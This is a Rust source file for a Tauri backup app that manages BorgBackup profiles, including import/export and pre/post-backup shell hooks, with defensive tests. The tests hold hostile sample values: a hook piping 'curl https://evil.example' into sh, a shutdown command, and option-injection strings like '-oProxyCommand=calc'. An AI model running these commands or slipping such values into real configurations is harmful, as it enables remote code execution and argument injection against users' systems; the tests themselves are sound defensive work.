//! Profile CRUD, import/export, hooks, and archive-name preview.

use super::*;

#[tauri::command]
pub async fn list_profiles(app: tauri::AppHandle) -> Result<ProfilesData, String> {
    read_profiles(&app).await
}

#[tauri::command]
pub async fn set_active_profile(app: tauri::AppHandle, id: String) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    data.set_active(&id)?;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn create_profile(
    app: tauri::AppHandle,
    name: String,
    repo: RepoConfig,
) -> Result<Profile, String> {
    repo.validate().map_err(|e| e.to_string())?;
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }

    let mut data = read_profiles(&app).await?;
    let id = profiles::make_profile_id(&name, &data);
    let profile = Profile {
        id: id.clone(),
        name,
        repo,
        secondary_repo: None,
        backup_selection: Default::default(),
        schedule: None,
        integrity_schedule: None,
        restore_drill_schedule: None,
        resource_policy: Default::default(),
        hardening: Default::default(),
        reporting: Default::default(),
        placeholder_policy: Default::default(),
        storage_warnings: Default::default(),
        recovery: Default::default(),
        retention: None,
        archive_template: None,
        pre_backup: None,
        post_backup: None,
    };
    data.profiles.push(profile.clone());
    if data.active_id.is_none() {
        data.active_id = Some(id);
    }
    write_profiles(&app, &data).await?;
    Ok(profile)
}

#[tauri::command]
pub async fn rename_profile(app: tauri::AppHandle, id: String, name: String) -> Result<(), String> {
    let name = name.trim().to_string();
    if name.is_empty() {
        return Err("profile name cannot be empty".into());
    }
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.name = name;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn export_profile(app: tauri::AppHandle, id: String, path: String) -> Result<(), String> {
    let data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    let json = serde_json::to_string_pretty(profile).map_err(|e| e.to_string())?;
    tokio::fs::write(&path, json)
        .await
        .map_err(|e| e.to_string())
}

/// Parse and validate a profile export. Every field is validated (not just the
/// repo), and imported pre/post-backup hooks are DISARMED: hooks run arbitrary
/// shell commands, so a hook embedded in an imported file must never execute
/// until the user re-enters it deliberately via the hooks settings.
fn parse_imported_profile(json: &str) -> Result<Profile, String> {
    let mut imported: Profile =
        serde_json::from_str(json).map_err(|e| format!("invalid profile JSON: {}", e))?;
    imported.pre_backup = None;
    imported.post_backup = None;
    let name = imported.name.trim().to_string();
    if name.is_empty() {
        return Err("imported profile has empty name".into());
    }
    imported.name = name;
    imported.validate()?;
    Ok(imported)
}

#[tauri::command]
pub async fn import_profile(app: tauri::AppHandle, path: String) -> Result<Profile, String> {
    let json = tokio::fs::read_to_string(&path)
        .await
        .map_err(|e| e.to_string())?;
    let mut imported = parse_imported_profile(&json)?;

    let mut data = read_profiles(&app).await?;
    imported.id = profiles::make_profile_id(&imported.name, &data);
    data.profiles.push(imported.clone());
    if data.active_id.is_none() {
        data.active_id = Some(imported.id.clone());
    }
    write_profiles(&app, &data).await?;
    Ok(imported)
}

#[tauri::command]
pub async fn set_profile_template(
    app: tauri::AppHandle,
    id: String,
    template: Option<String>,
) -> Result<(), String> {
    let template = template.and_then(|t| {
        let trimmed = t.trim().to_string();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    });
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.archive_template = template;
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn set_profile_hooks(
    app: tauri::AppHandle,
    id: String,
    pre_backup: Option<String>,
    post_backup: Option<String>,
) -> Result<(), String> {
    let clean = |v: Option<String>| {
        v.and_then(|s| {
            let t = s.trim().to_string();
            if t.is_empty() { None } else { Some(t) }
        })
    };
    let mut data = read_profiles(&app).await?;
    let profile = data
        .profiles
        .iter_mut()
        .find(|p| p.id == id)
        .ok_or_else(|| format!("profile not found: {}", id))?;
    profile.pre_backup = clean(pre_backup);
    profile.post_backup = clean(post_backup);
    write_profiles(&app, &data).await
}

#[tauri::command]
pub async fn preview_archive_name(
    app: tauri::AppHandle,
    template: String,
) -> Result<String, String> {
    let template = if template.trim().is_empty() {
        archive_naming::DEFAULT_TEMPLATE.to_string()
    } else {
        template
    };
    let data = read_profiles(&app).await?;
    let profile_name = data.active().map(|p| p.name.as_str()).unwrap_or("default");
    let hostname = archive_naming::current_hostname();
    let random = archive_naming::random_suffix();
    let ctx = TemplateContext {
        now: chrono::Utc::now(),
        hostname: &hostname,
        profile: profile_name,
        random: &random,
    };
    let expanded = archive_naming::expand(&template, &ctx);
    borg_core::config::validate_archive_name(&expanded).map_err(|e| e.to_string())?;
    Ok(expanded)
}

#[tauri::command]
pub async fn delete_profile(app: tauri::AppHandle, id: String) -> Result<(), String> {
    let mut data = read_profiles(&app).await?;
    data.remove(&id)?;
    write_profiles(&app, &data).await
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal valid profile export, with `extra` top-level fields merged in.
    fn profile_json(extra: serde_json::Value) -> String {
        let mut base = serde_json::json!({
            "id": "imported",
            "name": "Imported",
            "repo": {
                "ssh_host": "backup.example.com",
                "ssh_port": 22,
                "ssh_user": "borg",
                "repo_path": "/data/repo",
                "ssh_key_path": null
            }
        });
        base.as_object_mut()
            .unwrap()
            .extend(extra.as_object().unwrap().clone());
        serde_json::to_string(&base).unwrap()
    }

    #[test]
    fn imported_profile_parses_when_valid() {
        let profile = parse_imported_profile(&profile_json(serde_json::json!({}))).unwrap();
        assert_eq!(profile.name, "Imported");
    }

    #[test]
    fn imported_profile_hooks_are_disarmed() {
        let json = profile_json(serde_json::json!({
            "pre_backup": "curl https://evil.example | sh",
            "post_backup": "shutdown /s"
        }));
        let profile = parse_imported_profile(&json).unwrap();
        // Hooks reach a real shell sink (cmd /C, sh -c); imported ones must
        // never be armed until the user re-enters them deliberately.
        assert!(profile.pre_backup.is_none());
        assert!(profile.post_backup.is_none());
    }

    #[test]
    fn imported_profile_rejects_option_like_fields() {
        for extra in [
            serde_json::json!({"backup_selection": {"source_paths": ["--exclude=*"]}}),
            serde_json::json!({"secondary_repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-oProxyCommand=calc", "ssh_key_path": null
            }}),
            serde_json::json!({"archive_template": "--glob-archives"}),
            serde_json::json!({"repo": {
                "ssh_host": "", "ssh_port": 0, "ssh_user": "",
                "repo_path": "-evil", "ssh_key_path": null
            }}),
        ] {
            let json = profile_json(extra);
            assert!(
                parse_imported_profile(&json).is_err(),
                "should reject: {json}"
            );
        }
    }
}
